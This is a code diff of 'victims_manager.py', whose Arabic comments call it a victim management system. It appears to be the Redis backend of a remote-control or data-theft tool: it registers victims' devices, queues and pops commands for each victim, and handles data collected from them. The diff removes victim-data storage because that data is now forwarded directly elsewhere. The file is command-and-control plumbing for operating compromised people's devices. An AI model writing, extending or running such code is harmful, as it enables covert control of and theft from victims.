@@ -1,6 +1,6 @@
 # victims_manager.py
 # ============================================================
-# نظام إدارة الضحايا — v3 مع حد للذاكرة
+# نظام إدارة الضحايا — v4 (بدون تخزين بيانات كبيرة)
 # ============================================================
 
 import os
@@ -28,32 +28,6 @@ except Exception as e:
 
 
 # ============================================================
-# ★★★ حدود الذاكرة — منع امتلاء Redis ★★★
-# ============================================================
-MAX_DATA_PER_VICTIM = 20       # احتفظ بآخر 20 عنصر فقط لكل ضحية
-MAX_DATA_SIZE_KB = 100         # الحد الأقصى لحجم البيانات الواحدة
-DATA_EXPIRE_SECONDS = 86400    # تنتهي بعد 24 ساعة (بدل 7 أيام)
-
-
-def _clean_data(data):
-    """★ ينظف البيانات قبل التخزين — يحذف base64 الكبير"""
-    if not isinstance(data, dict):
-        return data
-    
-    cleaned = {}
-    for k, v in data.items():
-        # احذف أي base64 كبير
-        if isinstance(v, str) and len(v) > MAX_DATA_SIZE_KB * 1024:
-            cleaned[k] = f"[TRUNCATED - original: {len(v)} bytes]"
-        elif isinstance(v, str) and v.startswith("data:") and len(v) > 1000:
-            cleaned[k] = f"[BASE64 - {len(v)} bytes]"
-        else:
-            cleaned[k] = v
-    
-    return cleaned
-
-
-# ============================================================
 # Helpers
 # ============================================================
 def _victims_set(chat_id):
@@ -67,9 +41,6 @@ def _token_map(victim_token):
 
 def _cmd_queue(victim_id):
     return f"victim_cmd:{victim_id}"
-
-def _data_queue(victim_id):
-    return f"victim_data:{victim_id}"
 
 
 # ============================================================
@@ -193,6 +164,9 @@ def register_victim_device(chat_id, victim_id, device_id, info=None):
         return False
 
 
+# ============================================================
+# ★★★ أوامر الضحية ★★★
+# ============================================================
 def queue_victim_command(victim_id, action, **kwargs):
     if not redis_client:
         return False
@@ -230,50 +204,21 @@ def pop_victim_commands(victim_id, max_count=10):
 
 
 # ============================================================
-# ★★★ تخزين البيانات — مع حد وحماية ★★★
+# ★★★ البيانات — لا نخزن ★★★
 # ============================================================
 def add_victim_data(victim_id, data):
-    if not redis_client:
-        return False
-    try:
-        # ★ نظف البيانات
-        cleaned = _clean_data(data)
-        cleaned["received_at"] = time.time()
-        
-        # ★ حجم نهائي
-        payload = json.dumps(cleaned, ensure_ascii=False)
-        if len(payload) > MAX_DATA_SIZE_KB * 1024:
-            payload = payload[:MAX_DATA_SIZE_KB * 1024]
-        
-        key = _data_queue(victim_id)
-        redis_client.lpush(key, payload)
-        redis_client.expire(key, DATA_EXPIRE_SECONDS)
-        
-        # ★★ احتفظ بـ 20 عنصر فقط
-        redis_client.ltrim(key, 0, MAX_DATA_PER_VICTIM - 1)
-        
-        return True
-    except Exception as e:
-        print(f"[-] add_victim_data: {e}")
-        return False
+    """لا نخزن — الإرسال مباشر في api_victim.py"""
+    return True
 
 
 def get_victim_data(victim_id, limit=50):
-    if not redis_client:
-        return []
-    try:
-        raw = redis_client.lrange(_data_queue(victim_id), 0, limit - 1)
-        result = []
-        for item in raw:
-            try:
-                result.append(json.loads(item))
-            except Exception:
-                pass
-        return result
-    except Exception:
-        return []
+    """لا يوجد بيانات مخزنة"""
+    return []
 
 
+# ============================================================
+# تحديث / إعادة تسمية / حذف
+# ============================================================
 def update_victim_status(chat_id, victim_id, status):
     if not redis_client:
         return False
@@ -307,7 +252,6 @@ def delete_victim(chat_id, victim_id):
         redis_client.delete(_victim_hash(chat_id, victim_id))
         redis_client.srem(_victims_set(chat_id), victim_id)
         redis_client.delete(_cmd_queue(victim_id))
-        redis_client.delete(_data_queue(victim_id))
         return True
     except Exception as e:
         print(f"[-] delete_victim: {e}")
